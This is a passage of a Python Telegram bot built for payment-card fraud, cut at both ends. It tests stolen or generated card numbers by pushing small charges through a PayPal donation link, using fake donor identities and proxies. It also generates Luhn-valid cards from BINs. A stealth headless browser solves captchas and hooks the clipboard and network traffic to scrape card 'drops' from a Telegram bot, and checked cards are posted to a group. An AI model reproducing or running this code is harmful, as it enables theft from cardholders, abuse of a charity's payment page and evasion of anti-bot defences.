                    csrf_token = m_csrf.group(1)

                print(f"[PayPal NCP] clientId={client_id[:8]}... csrf={'ok' if csrf_token else 'missing'}", flush=True)
                return {"nonce": NCP_TOKEN, "client_id": client_id, "csrf_token": csrf_token}
            except Exception as e:
                if attempt == retries - 1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _create_order(self, nonce, amount, csrf_token=None, retries=3):
        """Create a PayPal order via the NCP create-order API (requires CSRF token)."""
        for attempt in range(retries):
            try:
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Origin": "https://www.paypal.com",
                    "Referer": NCP_PAYMENT_LINK,
                    "User-Agent": _BASE_HEADERS["User-Agent"],
                }
                if csrf_token:
                    headers["x-csrf-token"] = csrf_token
                    headers["csrf-token"] = csrf_token

                # Primary: NCP create-order (requires CSRF + session cookies)
                resp = self.session.post(
                    f"https://www.paypal.com/ncp/api/payment/{nonce}/create-order",
                    headers=headers,
                    json={"amount": f"{amount:.2f}", "currencyCode": "USD"},
                    timeout=30,
                )
                print(f"[PayPal NCP] create-order → {resp.status_code} {resp.text[:120]}", flush=True)
                if resp.status_code == 200:
                    data = resp.json()
                    order_id = (data.get("orderID") or data.get("id")
                                or data.get("token") or data.get("orderId"))
                    if order_id:
                        print(f"[PayPal NCP] Order created: {order_id[:16]}", flush=True)
                        return order_id

                # Fallback: NCP transaction endpoint
                resp2 = self.session.post(
                    f"https://www.paypal.com/ncp/api/payment/{nonce}/transaction",
                    headers=headers,
                    json={"amount": f"{amount:.2f}", "currencyCode": "USD"},
                    timeout=30,
                )
                print(f"[PayPal NCP] transaction → {resp2.status_code} {resp2.text[:120]}", flush=True)
                if resp2.status_code == 200:
                    data2 = resp2.json()
                    order_id = (data2.get("orderID") or data2.get("id")
                                or data2.get("token") or data2.get("orderId"))
                    if order_id:
                        print(f"[PayPal NCP] Order via transaction: {order_id[:16]}", flush=True)
                        return order_id

                raise RuntimeError(
                    f"NCP order creation failed: create-order={resp.status_code} transaction={resp2.status_code}"
                )
            except Exception as e:
                if attempt == retries - 1:
                    raise
                time.sleep(2)
                self.session = requests.Session()
                self.session.headers.update(_BASE_HEADERS)
                if self._proxy:
                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

    def _submit_payment(self, order_id, n, mm, yy, cvc, donor):
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard($token: String! $card: CardInput $phoneNumber: String $firstName: String $lastName: String
            $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType) {
            approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName
                lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType) { flags { is3DSecureRequired } cart { cartId } } }
        """
        address = {
            "givenName": donor["first_name"],
            "familyName": donor["last_name"],
            "line1": donor["line1"],
            "line2": None,
            "city": donor["city"],
            "state": donor["state"],
            "postalCode": donor["postal"],
            "country": "US",
        }
        card_type = self._detect_card_type(n)
        full_year = yy if len(yy) == 4 else f"20{yy}"
        phone = donor["phone"]
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": n,
                "type": card_type,
                "expirationDate": f"{mm}/{full_year}",
                "postalCode": donor["postal"],
                "securityCode": cvc,
            },
            "phoneNumber": phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
            "currencyConversionType": "PAYPAL",
        }
        try:
            self.session.get(f"https://www.paypal.com/smart/card-fields?token={order_id}&env=production",
                             headers={"Referer": "https://binnaclehouse.org/donation/", "Accept": "text/html"}, timeout=15)
        except:
            pass
        for use_proxy in [True, False]:
            if not use_proxy and self._proxy:
                self.session.proxies = None
            for attempt in range(3):
                try:
                    resp = self.session.post(
                        "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                        headers=headers,
                        json={"query": query, "variables": variables},
                        timeout=60,
                    )
                    if resp.status_code == 429:
                        time.sleep(int(resp.headers.get("Retry-After", 10)))
                        continue
                    if resp.status_code == 200:
                        try:
                            res = resp.json()
                            if "errors" in res:
                                err_msg = res["errors"][0].get("message", "Unknown")
                                code = res["errors"][0].get("data", [{}])[0].get("code", "")
                                full = f"{err_msg} ({code})" if code else err_msg
                                # Soft declines (card is good, but insufficient funds / 3D secure / auth required)
                                soft_hits = ["INSUFFICIENT_FUNDS", "CARD_AUTHORIZATION", "3D_SECURE",
                                             "DO_NOT_HONOR", "TRANSACTION_REFUSED"]
                                if any(k in full.upper() for k in soft_hits):
                                    return f"APPROVED|{full}"
                                else:
                                    return f"DECLINED|{full}"
                            if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                                return "CHARGED|Payment successful"
                            return f"UNKNOWN|{resp.text[:150]}"
                        except Exception as e:
                            return f"PARSE_ERROR|{e}"
                    else:
                        continue
                except requests.exceptions.ProxyError:
                    break
                except Exception as e:
                    if attempt == 2:
                        return f"ERROR|{e}"
                    time.sleep(2)
        return "DECLINED|No response after all retries"

    @staticmethod
    def _detect_card_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]|^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge(self, cc: str) -> str:
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        # Get BIN country hint (optional – helps with region)
        bin6 = n[:6]
        try:
            loop = asyncio.new_event_loop()
            bin_info = loop.run_until_complete(get_bin_info(bin6))
            loop.close()
            country_code = bin_info.get("country_code") if bin_info else None
        except:
            country_code = None
        self._bin_country = country_code if country_code in ("US", "CA") else None
        donor = self._random_donor()
        amount = self._random_amount()
        print(f"[PayPal] Checking {n[:4]}...{n[-4:]} amt=${amount:.2f}", flush=True)
        try:
            form_data = self._get_form_data()
            print(f"[PayPal] Got nonce={form_data['nonce'][:8]}... client_id={form_data['client_id'][:8]}...", flush=True)
            order_id = self._create_order(form_data["nonce"], amount, csrf_token=form_data.get("csrf_token"))
            print(f"[PayPal] Order created: {order_id[:16]}...", flush=True)
            result = self._submit_payment(order_id, n, mm, yy, cvc, donor)
            print(f"[PayPal] Result: {result[:120]}", flush=True)
            return result
        except Exception as e:
            import traceback
            print(f"[PayPal] ERROR: {e}", flush=True)
            traceback.print_exc()
            return f"ERROR|{e}"

# ======================================================================
# Card generation
# ======================================================================
def luhn_sum(card: str) -> int:
    total = 0
    for i, ch in enumerate(card[::-1]):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total

def generate_card_number(bin_prefix: str) -> str:
    bin_prefix = bin_prefix[:6]
    is_amex = bin_prefix[:2] in ("34", "37")
    length = 15 if is_amex else 16
    fill_len = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0,9)) for _ in range(fill_len))
    for check in range(10):
        candidate = body + str(check)
        if luhn_sum(candidate) % 10 == 0:
            return candidate
    return body + "0"

def generate_expiry():
    return f"{random.randint(1,12):02d}", str(random.randint(2025,2032))

def generate_cvv(card: str) -> str:
    return str(random.randint(1000,9999)) if card[:2] in ("34","37") else str(random.randint(100,999))

def generate_card_with_bin(bin_prefix: str) -> str:
    card = generate_card_number(bin_prefix)
    mm, yy = generate_expiry()
    cvv = generate_cvv(card)
    return f"{card}|{mm}|{yy}|{cvv}"

# ======================================================================
# xForce automation – uses copy button
# ======================================================================
def xlog(tag, msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] [{tag}] {msg}", flush=True)
    logger.info(msg)

DEDUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xforce_dedup.json")
class XForceAutomator:
    def __init__(self, bot_client, target_group):
        self.bot_client = bot_client
        self.target_group = target_group
        self.processed_links = set()
        self.processed_cards = set()
        self._drop_queue = asyncio.Queue()
        self._worker_task = None
        self._load_state()
    def _log(self, tag, msg): xlog(tag, msg)

    def _load_state(self):
        try:
            with open(DEDUP_FILE, "r") as f:
                data = json.load(f)
            self.processed_links = set(data.get("links", []))
            self.processed_cards = set(data.get("cards", []))
        except:
            pass
    def _save_state(self):
        try:
            with open(DEDUP_FILE, "w") as f:
                json.dump({"links": list(self.processed_links), "cards": list(self.processed_cards)}, f)
        except:
            pass

    async def _get_drop_url(self, event):
        msg = event.message
        if not msg.reply_markup:
            return None
        for row in msg.reply_markup.rows:
            for btn in row.buttons:
                if hasattr(btn, 'text') and "View Drop" in btn.text:
                    if hasattr(btn, 'url') and btn.url:
                        return btn.url
        return None

    async def _click_copy_button(self, page):
        """Click the xForce copy icon in the DROP header. Tries every known approach."""
        SELECTORS = [
            'button[class*="copy"]', 'button[class*="Copy"]', 'button[class*="clip"]',
            '[class*="copy-btn"]', '[class*="copyBtn"]', '[class*="copyButton"]',
            '[class*="drop"] button', '[class*="Drop"] button',
            'button[aria-label*="opy"]', 'button[title*="opy"]',
            'button:has-text("Copy")', 'a:has-text("Copy")',
            'i[class*="copy"]', 'i[class*="clipboard"]',
            'svg[data-icon="copy"]', 'svg[data-icon="clipboard"]',
        ]
        for sel in SELECTORS:
            try:
                for el in await page.query_selector_all(sel):
                    if await el.is_visible():
                        await el.click()
                        await page.wait_for_timeout(1200)
                        self._log("copy", f"Clicked via selector: {sel}")
                        return True
            except:
                continue
        # JS fallback: find any small button near card content
        try:
            found = await page.evaluate("""() => {
                const cardRe = /[0-9]{16,19}/;
                // Find the element containing card text
                let cardEl = null;
                for (const el of document.querySelectorAll('*')) {
                    if (['SCRIPT','STYLE','HEAD'].includes(el.tagName)) continue;
                    const t = (el.innerText || '').trim();
                    if (t.length > 10 && t.length < 600 && cardRe.test(t) && /\\|/.test(t)) {
                        cardEl = el; break;
                    }
                }
                // Look for a button near the card element (sibling, parent, nearby)
                const searchIn = cardEl ? [cardEl.parentElement, cardEl.parentElement?.parentElement, document.body] : [document.body];
                for (const root of searchIn) {
                    if (!root) continue;
                    for (const b of root.querySelectorAll('button,[role="button"],[class*="copy"],[class*="clip"]')) {
                        const r = b.getBoundingClientRect();
                        if (r.width > 0 && r.height > 0 && r.width < 80 && r.height < 80) {
                            b.click(); return true;
                        }
                    }
                }
                return false;
            }""")
            if found:
                await page.wait_for_timeout(1200)
                self._log("copy", "Clicked via JS proximity search")
                return True
        except:
            pass
        return False

    async def _extract_card_from_dom(self, page):
        """Read card text from the xForce DROP box or any visible element with card data."""
        try:
            text = await page.evaluate("""() => {
                // card|mm/yy|cvv pattern (xForce format)
                const xforceRe = /[0-9]{16,19}\\s*\\|\\s*[0-9]{1,2}\\s*\\/\\s*[0-9]{2,4}\\s*\\|\\s*[0-9]{3,4}/;
                // Skip noise tags
                const skip = new Set(['SCRIPT','STYLE','HEAD','META','LINK','NOSCRIPT']);
                const all = Array.from(document.querySelectorAll('*'));
                // Pass 1: strict xForce pattern, leaf-ish elements only
                for (const el of all) {
                    if (skip.has(el.tagName)) continue;
                    if (el.children.length > 8) continue;
                    const t = (el.innerText || '').trim();
                    if (t.length < 10 || t.length > 600) continue;
                    if (xforceRe.test(t)) return t;
                }
                // Pass 2: any visible element with 16-digit number + pipe separator
                const cardRe = /[0-9]{16,19}/;
                const pipeRe = /\\|/;
                for (const el of all) {
                    if (skip.has(el.tagName)) continue;
                    if (el.children.length > 4) continue;
                    const t = (el.innerText || '').trim();
                    if (t.length < 10 || t.length > 800) continue;
                    if (cardRe.test(t) && pipeRe.test(t)) return t;
                }
                // Last resort: visible body text
                return document.body.innerText || '';
            }""")
            return text or ""
        except:
            return ""

    async def _get_clipboard(self, page):
        try:
            # Primary: read from our intercepted writeText hook
            text = await page.evaluate("() => window.__xforce_card || ''") or ""
            if text:
                return text
            # Fallback: native clipboard API (works if browser grants it)
            text = await page.evaluate(
                "async () => { try { return await navigator.clipboard.readText(); } catch(e) { return ''; } }"
            ) or ""
            return text
        except:
            return ""

    async def _click_open_drop(self, page):
        open_selectors = [
            'button:has-text("Open Drop")',
            'button:has-text("OPEN DROP")',
            'a:has-text("Open Drop")',
            '[class*="open-drop"]',
            '[class*="openDrop"]',
            'button:has-text("View Drop")',
            'button:has-text("Open")',
        ]
        for sel in open_selectors:
            try:
                btn = await page.wait_for_selector(sel, timeout=12000)
                if btn and await btn.is_visible():
                    await btn.click()
                    self._log("open_drop", f"Clicked Open Drop via: {sel}")
                    await page.wait_for_timeout(6000)
                    return True
            except:
                continue
        # Check if drop content is already visible (no button needed)
        try:
            content = await self._extract_card_from_dom(page)
            if content and re.search(r'\d{16,19}', content):
                self._log("open_drop", "Drop content already visible — no button needed")
                return True
        except:
            pass
        return False

    async def _click_interstitial(self, page):
        for sel in ['a:has-text("OPEN APP")', 'button:has-text("OPEN APP")']:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    await page.wait_for_timeout(3000)
                    return True
            except:
                continue
        return False

    async def _resolve_url(self, tme_url, source_peer):
        try:
            parsed = urllib.parse.urlparse(tme_url)
            qs = urllib.parse.parse_qs(parsed.query)
            startapp = qs.get("startapp", [None])[0]
            if not startapp:
                return tme_url
            bot_entity = await self.bot_client.get_input_entity("xForceDropsBot")
            if source_peer:
                try:
                    peer = await self.bot_client.get_input_entity(source_peer)
                except:
                    peer = bot_entity
            else:
                peer = bot_entity
            result = await self.bot_client(RequestAppWebViewRequest(
                peer=peer,
                app=InputBotAppShortName(bot_id=bot_entity, short_name="webapp"),
                platform="android",
                start_param=startapp,
                write_allowed=True,
            ))
            return result.url
        except Exception as e:
            self._log("resolve", f"Failed: {e}")
            return tme_url

    async def check_and_forward(self, n, mm, yy, cvv):
        card = f"{n}|{mm}|{yy}|{cvv}"
        ts = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")
        self._log("check", f"Checking {n[:4]}...{n[-4:]} | {mm}/{yy}")

        # Run PayPal check + BIN lookup concurrently
        loop = asyncio.get_event_loop()
        try:
            paypal_result = await asyncio.wait_for(
                loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card),
                timeout=60
            )
        except asyncio.TimeoutError:
            paypal_result = "ERROR|PayPal check timed out"
        except Exception as e:
            paypal_result = f"ERROR|{str(e)[:100]}"

        bin_info = await get_bin_info(n[:6])

        # Status label
        upper = paypal_result.upper()
        if "CHARGED" in upper:      status = "CHARGED 💰"; emoji = "💰"
        elif "APPROVED" in upper:   status = "APPROVED ✅"; emoji = "✅"
        elif "DECLINED" in upper:   status = "DECLINED ❌"; emoji = "❌"
        else:                        status = "ERROR ⚠️";   emoji = "⚠️"

        resp_text = paypal_result.split("|", 1)[-1].strip() if "|" in paypal_result else paypal_result

        # Build message
        msg = (
            f"┏━━━━━━━⍟\n"
            f"┃ {emoji} **{status}**\n"
            f"┗━━━━━━━━━━━⊛\n"
            f"**[❃] Card**    ➜ `{card}`\n"
            f"**[❃] Gateway** ➜ PayPal\n"
            f"**[❃] Response** ➜ {resp_text}\n"
            f"**[❃] Time**    ➜ {ts}\n"
        )

        if bin_info:
            brand   = bin_info.get('brand', 'UNKNOWN')
            btype   = bin_info.get('type', 'UNKNOWN')
            bank    = bin_info.get('bank', 'Unknown')
            country = bin_info.get('country', 'Unknown')
            level   = bin_info.get('level', 'STANDARD')
            msg += (
                f"\n┏━━━━━━━⍟\n"
                f"┃ 🔍 **BIN INFO**\n"
                f"┗━━━━━━━━━━━⊛\n"
                f"**[❃] Brand**   ➜ {brand}\n"
                f"**[❃] Type**    ➜ {btype}\n"
                f"**[❃] Bank**    ➜ {bank}\n"
                f"**[❃] Country** ➜ {country}\n"
                f"**[❃] Level**   ➜ {level}\n"
                f"**[❃] BIN**     ➜ `{n[:6]}` | Last4 ➜ `{n[-4:]}`\n"
            )
        else:
            msg += f"**[❃] BIN**     ➜ `{n[:6]}` (lookup failed)\n"

        # Send to group
        try:
            await self.bot_client.send_message(
                self.target_group, msg, parse_mode='md'
            )
            self._log("forward", f"✅ Sent to group: {n[:4]}...{n[-4:]} → {status}")
        except Exception as e:
            self._log("forward", f"❌ send_message failed: {e}")
            # Retry without markdown in case of parse error
            try:
                plain = msg.replace('**', '').replace('`', '')
                await self.bot_client.send_message(self.target_group, plain)
                self._log("forward", f"✅ Sent (plain fallback)")
            except Exception as e2:
                self._log("forward", f"❌ Plain fallback also failed: {e2}")

    def _ensure_worker(self):
        if self._worker_task is None or self._worker_task.done():
            self._worker_task = asyncio.ensure_future(self._queue_worker())
    async def _queue_worker(self):
        while True:
            try:
                url, peer = await self._drop_queue.get()
                await self._run_browser(url, peer)
                self._drop_queue.task_done()
            except asyncio.CancelledError:
                break
            except Exception as e:
                self._log("worker", f"Error: {e}")

    async def _forward_card(self, n, mm, yy, cvv):
        """Dedup-check then forward card."""
        h = hashlib.md5(f"{n}|{mm}|{yy}|{cvv}".encode()).hexdigest()
        if h not in self.processed_cards:
            self.processed_cards.add(h)
            self._save_state()
            await self.check_and_forward(n, mm, yy, cvv)
        else:
            self._log("dedup", f"Skipping duplicate {n[:4]}...{n[-4:]}")

    async def _run_browser(self, url, peer):
        if not PLAYWRIGHT_OK:
            self._log("browser", "Playwright not available — skipping")
            return
        resolved = await self._resolve_url(url, peer)
        self._log("browser", f"Opening: {resolved[:80]}")
        _saved = os.environ.pop("LD_LIBRARY_PATH", None)

        # Collected card text from network responses
        _net_card_texts = []

        try:
            async with async_playwright() as p:
                # ── Anti-detection launch args ──────────────────────────────
                browser = await p.chromium.launch(
                    headless=True,
                    executable_path=PLAYWRIGHT_EXECUTABLE_PATH,
                    args=[
                        "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                        "--disable-web-security", "--allow-running-insecure-content",
                        "--disable-blink-features=AutomationControlled",
                        "--disable-infobars",
                        "--window-size=390,844",
                        "--lang=en-US,en",
                        "--no-first-run",
                        "--no-default-browser-check",
                        "--disable-extensions",
                        "--disable-features=IsolateOrigins,site-per-process",
                        "--disable-site-isolation-trials",
                        "--ignore-certificate-errors",
                        "--allow-insecure-localhost",
                    ]
                )
                ctx = await browser.new_context(
                    user_agent=(
                        "Mozilla/5.0 (Linux; Android 13; Pixel 7) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/124.0.6367.82 Mobile Safari/537.36"
                    ),
                    viewport={"width": 390, "height": 844},
                    locale="en-US",
                    permissions=["clipboard-read", "clipboard-write"],
                )
                await ctx.grant_permissions(["clipboard-read", "clipboard-write"])

                # ── Init script: full stealth + triple clipboard capture ──
                await ctx.add_init_script("""
                    // --- Full stealth fingerprint hiding ---
                    Object.defineProperty(navigator, 'webdriver', {get: () => false});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    Object.defineProperty(navigator, 'platform', {get: () => 'Linux aarch64'});
                    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                    Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 5});
                    try {
                        const orig = window.navigator.permissions.query.bind(window.navigator.permissions);
                        window.navigator.permissions.query = (p) =>
                            p.name === 'notifications'
                            ? Promise.resolve({state: Notification.permission})
                            : orig(p);
                    } catch(_) {}
                    try {
                        window.chrome = { runtime: {}, loadTimes: function(){}, csi: function(){}, app: {} };
                    } catch(_) {}
                    // Mask headless via screen properties
                    try { Object.defineProperty(screen, 'width',  {get: () => 390}); } catch(_) {}
                    try { Object.defineProperty(screen, 'height', {get: () => 844}); } catch(_) {}

                    // --- Card capture ---
                    window.__xforce_card = window.__xforce_card || '';
                    // 1) Intercept navigator.clipboard.writeText
                    try {
                        const _orig_cwt = navigator.clipboard.writeText.bind(navigator.clipboard);
                        navigator.clipboard.writeText = async function(text) {
                            if (text) window.__xforce_card = String(text);
                            try { return await _orig_cwt(text); } catch(_) {}
                        };
                    } catch(e) {}
                    // 2) Intercept document.execCommand('copy')
                    try {
                        const _orig_exec = document.execCommand.bind(document);
                        document.execCommand = function(cmd, showUI, val) {
                            if ((cmd||'').toLowerCase() === 'copy') {
                                try {
                                    const s = window.getSelection();
                                    if (s && s.toString().length > 10) window.__xforce_card = s.toString();
                                } catch(_) {}
                            }
                            return _orig_exec(cmd, showUI, val);
                        };
                    } catch(e) {}
                    // 3) Listen for copy events
                    document.addEventListener('copy', function(e) {
                        try {
                            const t = e.clipboardData && e.clipboardData.getData('text/plain');
                            if (t && t.length > 10) window.__xforce_card = t;
                        } catch(_) {}
                    }, true);
                    // 4) Poll DOM every 2s for card pattern and cache it
                    setInterval(function() {
                        try {
                            const cardRe = /[0-9]{15,19}[|/][0-9]{1,2}[|/][0-9]{2,4}[|/ ][0-9]{3,4}/;
                            const t = document.body && document.body.innerText;
                            if (t && cardRe.test(t)) {
                                const m = t.match(cardRe);
                                if (m) window.__xforce_card = m[0];
                            }
                        } catch(_) {}
                    }, 2000);
                """)

                page = await ctx.new_page()

                # ── Network response interception ───────────────────────────
                CARD_RE = re.compile(r'\d{16,19}')
                async def on_response(response):
                    try:
                        ct = response.headers.get("content-type", "")
                        if "json" in ct or "text" in ct:
                            body = await response.text()
                            if CARD_RE.search(body) and ("|" in body or "/" in body):
                                _net_card_texts.append(body)
                                self._log("net", f"Captured API response ({len(body)} chars)")
                    except:
                        pass
                page.on("response", on_response)

                # ── Step 1: Navigate ────────────────────────────────────────
                try:
                    await page.goto(resolved, wait_until="domcontentloaded", timeout=60000)
                except Exception as e:
                    self._log("browser", f"goto warn: {e}")
                try:
                    await page.wait_for_load_state("networkidle", timeout=12000)
                except:
                    pass

                # ── Step 2: Dismiss interstitials ───────────────────────────
                await self._click_interstitial(page)
                await page.wait_for_timeout(1500)

                # ── Step 3: Click Open Drop ─────────────────────────────────
                opened = await self._click_open_drop(page)
                self._log("browser", f"Open Drop: {opened}")

                # ── Step 4: Solve captcha ───────────────────────────────────
                captcha_ok = await solve_hcaptcha(page)
                self._log("browser", f"Captcha: {captcha_ok}")

                # ── Step 5: Wait for card content (up to 60s, max 3 timeout retries) ──
                self._log("browser", "Waiting for drop content...")
                card_appeared = False
                _timeout_retries = 0
                for attempt in range(30):
                    await page.wait_for_timeout(2000)
                    body_text = (await page.evaluate("() => document.body.innerText") or "").strip()
                    body_lower = body_text.lower()
                    timed_out = "timed out" in body_lower or "verification timed out" in body_lower
                    still_security = (
                        "analyzing" in body_lower
                        or ("security" in body_lower and "drop" not in body_lower)
                        or timed_out
                    )
                    if not still_security and CARD_RE.search(body_text):
                        self._log("browser", f"Card visible after {(attempt+1)*2}s")
                        card_appeared = True
                        break
                    if _net_card_texts:
                        self._log("browser", "Card data already captured via network")
                        card_appeared = True
                        break
                    if still_security:
                        if timed_out:
                            _timeout_retries += 1
                            if _timeout_retries >= 3:
                                self._log("browser", "Max timeout retries reached — giving up")
                                break
                            self._log("browser", f"Verification timed out (retry {_timeout_retries}/3) — reloading")
                            try:
                                await page.reload(wait_until="domcontentloaded", timeout=30000)
                                await page.wait_for_timeout(3000)
                                await self._click_open_drop(page)
                                await page.wait_for_timeout(2000)
                                await solve_hcaptcha(page)
                            except:
                                pass
                        elif attempt % 4 == 3:
                            self._log("browser", f"Security screen at {(attempt+1)*2}s — retrying captcha")
                            await solve_hcaptcha(page)
                    else:
                        await page.wait_for_timeout(2000)
                        card_appeared = True
                        break

                # ── Step 6: Screenshot ──────────────────────────────────────
                try:
                    ss = f"/tmp/xforce_{int(time.time())}.png"
                    await page.screenshot(path=ss)
                    self._log("browser", f"Screenshot: {ss}")
                except:
                    pass

                # ── Step 7: Click copy button → capture clipboard ───────────
                card = None
                clicked = await self._click_copy_button(page)
                await page.wait_for_timeout(800)
                clip_text = await self._get_clipboard(page)
                self._log("browser", f"Clipboard ({len(clip_text)} chars): {clip_text[:100]}")
                if clip_text:
                    card = extract_card_from_text(clip_text)

                # ── Step 8: DOM extraction fallback ────────────────────────
                if not card:
                    self._log("browser", "Trying DOM extraction")
                    dom_text = await self._extract_card_from_dom(page)
                    self._log("browser", f"DOM ({len(dom_text)} chars): {dom_text[:120]}")
                    if dom_text:
                        card = extract_card_from_text(dom_text)

                # ── Step 9: Network response fallback ───────────────────────
                if not card and _net_card_texts:
                    self._log("browser", f"Trying {len(_net_card_texts)} captured network response(s)")
                    for body in _net_card_texts:
                        card = extract_card_from_text(body)
                        if card:
                            self._log("browser", "Card extracted from network response")
                            break

                # ── Step 10: Forward ────────────────────────────────────────
                if card:
                    n, mm, yy, cvv = card
                    self._log("browser", f"✅ Extracted: {n[:4]}...{n[-4:]} {mm}/{yy} cvv={cvv}")
                    await self._forward_card(n, mm, yy, cvv)
                else:
                    self._log("browser", "❌ No card found — check screenshot in /tmp/")

                await browser.close()
        except Exception as e:
            self._log("browser", f"Error: {e}")
            import traceback; traceback.print_exc()
        finally:
            if _saved is not None:
                os.environ["LD_LIBRARY_PATH"] = _saved

    async def on_message(self, event):
        text = event.raw_text or ""

        # Check inline buttons for a "View Drop" / "Open Drop" URL — even if message text is empty
        url = await self._get_drop_url(event)
        if url:
            if url not in self.processed_links:
                self.processed_links.add(url)
                self._save_state()
                self._log("trigger", f"Drop URL queued: {url[:60]}")
                await self._drop_queue.put((url, event.chat))
                self._ensure_worker()
            return  # URL found — don't double-process as plain card

        # Also trigger on text keywords (legacy support)
        upper = text.upper()
        if "VIEW DROP" in upper or "OPEN DROP" in upper:
            url2 = await self._get_drop_url(event)
            if url2 and url2 not in self.processed_links:
                self.processed_links.add(url2)
                self._save_state()
                await self._drop_queue.put((url2, event.chat))
                self._ensure_worker()

        # If message itself contains a raw card (e.g. xForce bot reply), forward directly
        if text:
            card = extract_card_from_text(text)
            if card:
                await self._forward_card(*card)

# ======================================================================
# Main bot logic
# ======================================================================
async def find_entity_by_title(title: str):
    title_lower = title.lower()
    async for dialog in client.iter_dialogs():
        if hasattr(dialog.entity, "title") and dialog.entity.title:
            if title_lower in dialog.entity.title.lower():
                return dialog.entity
    return None

async def join_and_resolve(chat: str):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat:
            invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat:
            invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            try:
                info = await client(CheckChatInviteRequest(hash=invite))
                chat_obj = getattr(info, 'chat', None)
                if chat_obj:
                    print(f"[OK] Already in group: {getattr(chat_obj, 'title', invite)}")
                    return chat_obj
            except:
                pass
            async for dialog in client.iter_dialogs():
                e = dialog.entity
                if getattr(e, 'megagroup', False) or getattr(e, 'broadcast', False):
                    return e
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try:
            return await client.get_entity(chat)
        except:
            pass
        entity = await find_entity_by_title(chat)
        if entity:
            return entity
        logger.error(f"Resolve failed for: {chat}")
        return None

async def run_scraper():
    await client.connect()
    if not await client.is_user_authorized():
        raise RuntimeError("❌ Session expired. Open Shell and run: python3 auth.py")
    print(f"[🤖 {BOT_USERNAME}] Bot online", flush=True)
    print(f"📡 Watching: {SOURCE_CHATS_RAW}", flush=True)
    print(f"📤 Forwarding to: {FORWARD_TARGET}", flush=True)
    if not PLAYWRIGHT_OK:
        print("[WARN] Playwright missing – xForce drops disabled", flush=True)
    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            title = getattr(entity, 'title', None) or getattr(entity, 'username', chat)
            print(f"[OK] Watching: {title}", flush=True)
        else:
            print(f"[WARN] Could not resolve: {chat}", flush=True)
    if not resolved:
        print("[ERROR] No channels resolved.", flush=True)
        return

    xforce = XForceAutomator(client, FORWARD_TARGET)
    async def handle_messages(event):
        text = event.raw_text or ""
        card = extract_card_from_text(text)
        if card:
            await xforce.check_and_forward(*card)
        await xforce.on_message(event)

    client.add_event_handler(handle_messages, events.NewMessage(chats=resolved))
    client.add_event_handler(xforce.on_message, events.NewMessage(chats=[XFORCE_BOT_USERNAME], incoming=True))

    # Commands
    async def handle_commands(event):
        text = (event.raw_text or "").strip()
        parts = text.split(None, 2)
        cmd = parts[0].lower().lstrip("/").split("@")[0]
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            await event.reply("Commands: /gen, /bin, /st, /chkpp, /drop, /status, /addchat, /removechat, /clearchat")
        elif cmd == "gen":
            args_parts = args.strip().split()
            if not args_parts:
                await event.reply("Usage: `/gen 414720` or `/gen 414720 10`")
                return
            bin_prefix = args_parts[0][:6]
            if not bin_prefix.isdigit():
                await event.reply("Invalid BIN")
                return
            count = 1
            if len(args_parts) > 1:
                try: count = min(int(args_parts[1]), 100)
                except: count = 1
            bin_info = await get_bin_info(bin_prefix) if len(bin_prefix) >= 6 else None
            cards = [generate_card_with_bin(bin_prefix) for _ in range(count)]
            if bin_info:
